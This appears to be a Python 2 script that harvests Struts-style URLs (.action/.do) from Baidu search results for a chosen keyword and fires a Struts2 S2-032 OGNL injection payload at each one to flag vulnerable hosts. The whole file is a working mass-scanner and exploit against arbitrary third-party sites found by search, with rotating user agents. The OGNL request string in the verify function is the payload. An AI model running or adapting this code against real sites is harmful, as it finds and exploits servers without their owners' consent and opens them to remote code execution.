# usr/bin/env python
# coding: utf-8
import urllib2
import urllib
import re
import random
import requests
  
user_agents = ['Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0', \
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0', \
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ \
        (KHTML, like Gecko) Element Browser 5.0', \
        'IBM WebExplorer /v0.94', 'Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)', \
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', \
        'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14', \
        'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) \
        Version/6.0 Mobile/10A5355d Safari/8536.25', \
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) \
        Chrome/28.0.1468.0 Safari/537.36', \
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; TheWorld)']
  

def baidu_search(keyword,pn):
    p= {'wd': keyword} 
    res=urllib2.urlopen(("http://www.baidu.com/s?"+urllib.urlencode(p)+"&pn={0}&cl=3&rn=10").format(pn)) #rn为每页的显示数目 pn表示当前显示的是第pn条搜索结果
    html=res.read()
    return html


def getList(regex, text): #将获取的url去重并存入list
    arr = []
    res = re.findall(regex, text)
    if res:
        for r in res:
            arr.append(r)
    return arr


def getMatch(regex,text):  #匹配函数
    res = re.findall(regex, text)
    if res:
        return res[0]
    return ''


def is_struts(url):
    regex = r'([\S\s]*?\.action)[\S\s]*?|([\S\s]*?\.do)[\S\s]*?'
    res = re.search(regex, url)
    if res:
        return res.group(1)
    else:
        return None


def get_host(url):
    regex = r'http://([\S\s]*?)/[\S\s]*?'
    res = re.search(regex, url)
    if res:
        #print res.group(1)
        return res.group(1)
    else:
        #print 0
        return None


def geturl(keyword, pages): #获取url
    targets = []
    hosts= []
    for page in range(0, int(pages)):
        pn=(page+1)*10
        html = baidu_search(keyword,pn)   
        content = unicode(html, 'utf-8','ignore')
        arrList = getList(u"<div class=\"f13\">(.*)</div>", content) #分割页面块
        for item in arrList:
            regex = u"data-tools='\{\"title\":\"(.*)\",\"url\":\"(.*)\"\}'"
            link = getMatch(regex, item)
            url = link[1]                     #获取百度改写url
            try: 
                domain = urllib2.Request(url)
                r = random.randint(0, 11)
                domain.add_header('User-agent', user_agents[r])
                domain.add_header('connection', 'keep-alive')
                response = urllib2.urlopen(domain)
                uri = response.geturl()
                urs = is_struts(uri)
                host = get_host(uri)
                if urs:
                    if (urs in targets) or (host in hosts):
                        continue
                    else:
                        targets.append(urs)
                        hosts.append(host)
            except:
                continue
    print "urls have been grabed already!!!"
    return targets

def verify(url):
    urls = url+"?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2 S2-032 Vulnerable%23%23%23"
    print "testing  "+url
    try:
        get = requests.get(urls)
        if 'Struts2 S2-032 Vulnerable' in get.text:
            print url + " is Vulnerable"
    except:
        pass


if __name__ == "__main__":
    keyword = raw_input("keywords>>")
    urls = geturl(keyword, 1)
    #print urls
    for url in urls:
        verify(url)